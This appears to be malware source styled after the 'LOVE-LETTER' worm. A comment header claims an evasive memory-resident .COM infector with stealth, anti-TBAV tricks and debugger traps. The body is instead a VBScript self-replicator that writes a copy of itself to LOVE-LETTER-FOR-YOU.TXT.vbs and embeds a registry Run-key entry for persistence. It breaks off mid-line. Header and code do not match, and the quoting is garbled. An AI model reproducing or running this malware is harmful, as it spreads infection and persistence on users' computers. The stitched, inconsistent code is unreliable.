; =======================================================================>
;  LOVE-LETTER-TO-YOU by khr1st - 2023 
;  [a copy of the original]
;
;  This is a memory resident .COM infector which hides itself using
;  directory stealth (11/12 and 4E/4F). To avoid setting heuristic
;  flags in TBAV, it overwrites part of the decryption routine with
;  garbage and adds instructions to repair it on the header of the
;  program. Runs through TBAV flawlessly. Examine it in action and
;  observe for yourself.
;
;  This virus also includes debugger traps to thwart tracing.
; =======================================================================>





On Error Resume Next
Dim fso, fh, sf
Set fso = CreateObject("Scripting.FileSystemObject")
Set fh = fso.OpenTextFile(WScript.ScriptFullName,1)
sf = fh.ReadAll
fh.Close
If InStr(sf,"LOVE-LETTER-FOR-YOU.TXT.vbs")=0 Then
   Set fh = fso.CreateTextFile("LOVE-LETTER-FOR-YOU.TXT.vbs")
   fh.Write "On Error Resume Next" & vbCrLf
   fh.Write "Dim fso, fh, sf" & vbCrLf
   fh.Write "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
   fh.Write "Set fh = fso.OpenTextFile(WScript.ScriptFullName,1)" & vbCrLf
   fh.Write "sf = fh.ReadAll" & vbCrLf
   fh.Write "fh.Close" & vbCrLf
   fh.Write "If InStr(sf,""LOVE-LETTER-FOR-YOU.TXT.vbs"")=0 Then" & vbCrLf
   fh.Write "   Set fh = fso.CreateTextFile(""LOVE-LETTER-FOR-YOU.TXT.vbs"")" & vbCrLf
   fh.Write "   fh.Write ""On Error Resume Next"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""Dim fso, fh, sf"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""Set fso = CreateObject(""""Scripting.FileSystemObject"""")"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""Set fh = fso.OpenTextFile(WScript.ScriptFullName,1)"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""sf = fh.ReadAll"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""fh.Close"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""If InStr(sf,""LOVE-LETTER-FOR-YOU.TXT.vbs"")=0 Then"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""   Set fh = fso.CreateTextFile(""LOVE-LETTER-FOR-YOU.TXT.vbs"")"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""   fh.Write ""On Error Resume Next"" & vbCrLf"" & vbCrLf
   fh.Write "   fh.Write ""   fh.Write ""Dim wsh"" & vbCrLf"" & vbCrLf
   fh.Write "   fh.Write ""   fh.Write ""Set wsh = WScript.CreateObject(""""WScript.Shell"""")"" & vbCrLf"" & vbCrLf
   fh.Write "   fh.Write ""   fh.Write ""wsh.RegWrite """"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\LOVE-LETTER-FOR-YOU"""",WScript.ScriptFullName,""REG_SZ"""" & vbCrLf"" & vbCrLf
   fh.Write "   fh.Write ""   Dim i, file, f1, f2, l"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""   Dim msg(50)"" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""   msg(1) = """"I love you"""""" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""   msg(2) = """"I cannot imagine living without you"""""" & vbCrLf" & vbCrLf
   fh.Write "   fh.Write ""   msg(3) = """"I love you because..."""""" & vbCrLf" & vbCrLf
   fh.Write "  

